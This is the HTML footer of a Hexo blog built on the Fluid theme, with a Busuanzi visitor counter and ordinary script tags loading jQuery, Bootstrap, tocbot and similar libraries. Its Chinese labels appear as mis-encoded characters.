      â¤ï¸  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  


  <!-- PV/UV ç»Ÿè®¡ï¼ˆBusuanziï¼‰ -->
  
    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
      ğŸ‘â€ğŸ—¨ æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_page_pv">è½½å…¥ä¸­...</span>  
      ğŸ§‘ æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv">è½½å…¥ä¸­...</span>
    </div>
    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
  


</div>

<script src="/js/summon-plane.js"></script>



  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/xm_custom/custom.js"></script>
<script src="/js/scrollAnimation.js"></script>
<script src="/js/Background.js"></script>



<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>



